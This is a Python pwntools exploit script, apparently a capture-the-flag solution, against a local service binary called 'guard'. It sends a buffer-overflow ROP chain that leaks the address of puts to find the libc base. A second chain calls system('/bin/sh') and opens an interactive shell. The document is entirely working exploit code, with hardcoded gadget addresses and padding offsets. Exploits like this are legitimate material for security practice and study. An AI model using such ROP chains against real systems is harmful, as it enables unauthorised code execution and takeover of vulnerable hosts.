#!/usr/bin/env python3
from pwn import *

p = remote("127.0.0.1",1337)

elf = ELF('../guard')
libc = ELF('../libc.so.6')
# p = elf.process()

# def debug():
# 	gdb.attach(p, gdbscript='b * game+104')
# 	sleep(1)

p.sendline(b'1')
p.sendline(b'2204')
p.clean()

Payload = b'A'*56
Payload += p64(0x0000000000401256) # pop rdi
Payload += p64(elf.got[b'puts'])
Payload += p64(elf.plt[b'puts'])
Payload += p64(0x00000000004011cf) # ret
Payload += p64(0x40132f) # game
Payload += b'A'*(2096-len(Payload))
Payload += p64(0x404300) # random address so we don't crash
Payload += b'A'*100
print(len(Payload))

p.sendline(Payload)
sleep(1)

Leak = u64(p.readuntil(b'\n')[:-1].ljust(8, b'\x00'))
Leak = Leak - libc.sym[b'puts']
print("Libc base at {}".format(hex(Leak)))

p.sendline()
Payload = b'A'*56
Payload += p64(0x0000000000401256) # pop rdi
Payload += p64(Leak+next(libc.search(b'/bin/sh\x00')))
Payload += p64(Leak+libc.sym[b'system'])
p.sendline(Payload)

p.interactive()
